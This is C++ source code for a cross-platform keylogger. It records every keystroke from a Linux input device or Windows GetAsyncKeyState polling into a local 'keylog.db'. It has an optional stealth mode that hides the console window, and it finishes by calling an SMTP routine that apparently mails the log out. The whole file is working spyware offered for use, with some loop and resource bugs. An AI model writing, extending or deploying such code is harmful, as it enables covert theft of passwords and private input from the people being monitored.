#include <string>
#include "smtp_attach.h"
#include "keytxt.h"
#include "keyrecord.h"
#include "keyvalue.h"

#if defined(__linux)
#include <fcntl.h>
#include <unistd.h>
#include "linux_keyrecord.h"
#elif defined(_WIN32)
#include <iostream>
#include <fstream>
#include <cstdio>
#include <windows.h>
#include <winuser.h>
#include <time.h>
#include "windows_keyrecord.h"
#endif

using namespace std;



#define DB_FILENAME				"keylog.db"
#define STEALTHMODE             false

#define LINUX_ESCAPE            keylog::value_f1
#define WINDOWS_ESCAPE          keylog::value_f2


#if defined(__linux)
#define LINUX_DEVICE_FILENAME	"/dev/input/event2"
#elif defined(_WIN32)
bool log(int key_stroke, FILE* myFile)
{
    if((key_stroke == 1) || (key_stroke == 2))
    {
        return true;
    }
    time_t rawtime;
    time (&rawtime);

    printf("(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
    if(key_stroke == VK_F2)
    {
        return false;
    }
    else
    {
        fprintf(myFile,"(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
        fclose(myFile);
        return true;
    }
}

void stealth(bool isHidden)
{
    if (isHidden)
    {
        HWND Stealth;
        AllocConsole();
        Stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Stealth,0);
    }
}
#endif






int main()
{
    string db_filename = DB_FILENAME;
    keylog_txt::KeyTXT keydb = keylog_txt::KeyTXT(db_filename);

#if defined(__linux)
    string device_filename = LINUX_DEVICE_FILENAME;
    int device_file = open(device_filename.c_str(), O_RDONLY);
    struct input_event event;
#elif defined(_WIN32)
#if STEALTHMODE == true
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
#endif
#endif

    while(true)
    {
#if defined(__linux)
        read(device_file, &event, sizeof(struct input_event));
        if(event.type == 1)
        {
            keylog::KeyRecord* keyRecord = new keylog_linux::KeyRecord(event);
            keydb.insert(keyRecord);

            if(keyRecord->getValue() == LINUX_ESCAPE)
            {
                break;
            }

            delete keyRecord;
        }
#elif defined(_WIN32)

        for(keylog::KeyValue keyValue = keylog::value_first; keyValue != keylog::value_last; keyValue++) {
            short keyState = GetAsyncKeyState(keyValue);
            bool msb = keyState >> 15;
            bool lsb = keyState & 0x1;
            if (msb && lsb) {
                time_t rawtime;
                time (&rawtime);

                keylog::KeyRecord* keyRecord = new keylog_windows::KeyRecord((time_t) rawtime, keyValue);
                keydb.insert(keyRecord);

                if(keyRecord->getValue() == WINDOWS_ESCAPE) {
                    break;
                }

                delete keyRecord;
            }
        }
#endif
    }
    keydb.close();
    main_smtp();
    return 0;
}
